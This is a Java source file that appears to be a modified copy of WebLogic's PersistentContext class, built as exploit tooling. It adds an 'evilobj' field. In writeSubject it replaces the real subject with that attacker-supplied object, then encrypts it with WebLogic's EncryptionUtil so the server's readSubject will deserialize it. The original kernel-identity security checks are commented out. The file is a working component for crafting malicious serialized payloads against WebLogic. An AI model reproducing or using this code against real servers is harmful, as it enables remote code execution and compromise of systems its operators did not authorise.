package weblogic.wsee.jaxws.persistence;

//import com.sun.istack.NotNull;
//import com.sun.istack.Nullable;
import com.sun.istack.internal.NotNull;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.security.AccessController;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.locks.ReentrantReadWriteLock;

import com.sun.istack.internal.Nullable;
import weblogic.kernel.KernelStatus;
import weblogic.security.acl.internal.AuthenticatedSubject;
import weblogic.security.service.PrivilegedActions;
import weblogic.security.service.SecurityServiceManager;
import weblogic.wsee.WseeCoreLogger;
import weblogic.wsee.persistence.AbstractStorable;


public class PersistentContext extends AbstractStorable {
    private static final long serialVersionUID = 1L;
    private static final AuthenticatedSubject KERNEL_ID = (AuthenticatedSubject)AccessController.doPrivileged(PrivilegedActions.getKernelIdentityAction());
    private transient ReentrantReadWriteLock _lock;
    private Map<String, Serializable> _propertyMap;
    private Set<String> _propBagClassNames;
    private Map<String, Serializable> _contextPropertyMap;
    private Map<String, Serializable> _invocationPropertyMap;
    private AuthenticatedSubject _subject;
    private PersistentContext.State _state;
    private Object evilobj;

    public static PersistentContextStore getStoreMap(String var0) {
        try {
            return PersistentContextStore.getStore(var0);
        } catch (Exception var2) {
            throw new RuntimeException(var2.toString(), var2);
        }
    }

    private static AuthenticatedSubject getCurrentSubject() {
        AuthenticatedSubject var0 = SecurityServiceManager.getCurrentSubject(KERNEL_ID);
        return var0;
    }

    private void writeObject(ObjectOutputStream var1) throws IOException {
        try {
            this._lock.readLock().lock();
            var1.writeObject(this._propertyMap);
            var1.writeObject(this._propBagClassNames);
            var1.writeObject(this._contextPropertyMap);
            var1.writeObject(this._invocationPropertyMap);
            var1.writeObject(this._state);
            this.writeSubject(var1);
        } finally {
            this._lock.readLock().unlock();
        }

    }

    private void writeSubject(ObjectOutputStream var1) throws IOException {
        ByteArrayOutputStream var2 = new ByteArrayOutputStream();
        ObjectOutputStream var3 = new ObjectOutputStream(var2);

        //if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) {
        //    AuthenticatedSubject var4 = (AuthenticatedSubject)SubjectManager.getSubjectManager().getAnonymousSubject();
        //    var3.writeObject(var4);
        //} else {
        //    var3.writeObject(this._subject);
        //}
        try {
            var3.writeObject(evilobj);
        } catch (Exception e) {
            e.printStackTrace();
        }

        var3.flush();
        byte[] var5 = var2.toByteArray();
        //if (KernelStatus.isServer()) {
        //    var5 = EncryptionUtil.encrypt(var5);
        //}
        //var5 = EncryptionUtil.encrypt(var5);

        var5 = EncryptionUtil.getEncryptionService().encryptBytes((byte []) var5);

        var1.writeInt(var5.length);
        var1.write(var5);
    }

    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        this.initTransients();

        try {
            this._lock.writeLock().lock();
            this._propertyMap = (Map)var1.readObject();
            this._propBagClassNames = (Set)var1.readObject();
            this._contextPropertyMap = (Map)var1.readObject();
            this._invocationPropertyMap = (Map)var1.readObject();
            this._state = (PersistentContext.State)var1.readObject();
            this.readSubject(var1);
        } finally {
            this._lock.writeLock().unlock();
        }

    }

    protected void initTransients() {
        this._lock = new ReentrantReadWriteLock(false);
    }

    private void readSubject(ObjectInputStream var1) {
        try {
            int var2 = var1.readInt();
            byte[] var3 = new byte[var2];
            var1.readFully(var3);
            if (KernelStatus.isServer()) {
                var3 = EncryptionUtil.decrypt(var3);
            }

            ByteArrayInputStream var4 = new ByteArrayInputStream(var3);
            ObjectInputStream var5 = new ObjectInputStream(var4);
            this._subject = (AuthenticatedSubject)var5.readObject();
        } catch (Exception var6) {
            WseeCoreLogger.logUnexpectedException("Couldn't completely read PersistentContext subject", var6);
        }

    }

    public PersistentContext(@NotNull String var1, @NotNull Map<String, Serializable> var2, @NotNull Set<String> var3, @Nullable Map<String, Serializable> var4, @NotNull Map<String, Serializable> var5, Object input) {
        super(var1);
        evilobj = input;
        this._propertyMap = var2;
        this._propBagClassNames = var3;
        this._contextPropertyMap = var4;
        this._invocationPropertyMap = var5;
        this._state = PersistentContext.State.UNUSED;
        AuthenticatedSubject var6 = getCurrentSubject();
        this._subject = var6;
        this.initTransients();
    }
    public PersistentContext(@NotNull String var1, @NotNull Map<String, Serializable> var2, @NotNull Set<String> var3, @Nullable Map<String, Serializable> var4, @NotNull Map<String, Serializable> var5) {
        super(var1);
        this._propertyMap = var2;
        this._propBagClassNames = var3;
        this._contextPropertyMap = var4;
        this._invocationPropertyMap = var5;
        this._state = PersistentContext.State.UNUSED;
        AuthenticatedSubject var6 = getCurrentSubject();
        //if (SecurityServiceManager.isKernelIdentity(var6)) {
        //    throw new IllegalStateException("Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal");
        //} else {
        //    this._subject = var6;
        //    this.initTransients();
       // }
        this._subject = var6;
        this.initTransients();
    }

    @NotNull
    public Map<String, Serializable> getPropertyMap() {
        Map var1;
        try {
            this._lock.readLock().lock();
            var1 = this._propertyMap;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    @NotNull
    public Set<String> getPropertyBagClassNames() {
        Set var1;
        try {
            this._lock.readLock().lock();
            var1 = this._propBagClassNames;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    @Nullable
    public Map<String, Serializable> getContextPropertyMap() {
        Map var1;
        try {
            this._lock.readLock().lock();
            var1 = this._contextPropertyMap;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    @NotNull
    public Map<String, Serializable> getInvocationPropertyMap() {
        Map var1;
        try {
            this._lock.readLock().lock();
            var1 = this._invocationPropertyMap;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    public PersistentContext.State getState() {
        this._lock.readLock().lock();

        PersistentContext.State var1;
        try {
            var1 = this._state;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    public void setState(PersistentContext.State var1) {
        this._lock.writeLock().lock();

        try {
            this._state = var1;
        } finally {
            this._lock.writeLock().unlock();
        }

    }

    @NotNull
    public String getSubjectAsString() {
        String var1;
        try {
            this._lock.readLock().lock();
            var1 = this._subject.toString();
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    AuthenticatedSubject getSubject(AuthenticatedSubject var1) {
        if (!SecurityServiceManager.isKernelIdentity(var1)) {
            throw new SecurityException("Unauthorized access to PersistentContext.getSubject()");
        } else {
            AuthenticatedSubject var2;
            try {
                this._lock.readLock().lock();
                var2 = this._subject;
            } finally {
                this._lock.readLock().unlock();
            }

            return var2;
        }
    }

    public String getMessageId() {
        String var1;
        try {
            this._lock.readLock().lock();
            var1 = (String)this.getObjectId();
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    public boolean hasExplicitExpiration() {
        this._lock.readLock().lock();

        boolean var1;
        try {
            var1 = this._state == PersistentContext.State.IN_USE;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    public boolean isExpired() {
        this._lock.readLock().lock();

        boolean var1;
        try {
            var1 = this._state != PersistentContext.State.IN_USE;
        } finally {
            this._lock.readLock().unlock();
        }

        return var1;
    }

    public static enum State {
        UNUSED,
        IN_USE,
        OBSOLETE;

        private State() {
        }
    }

}
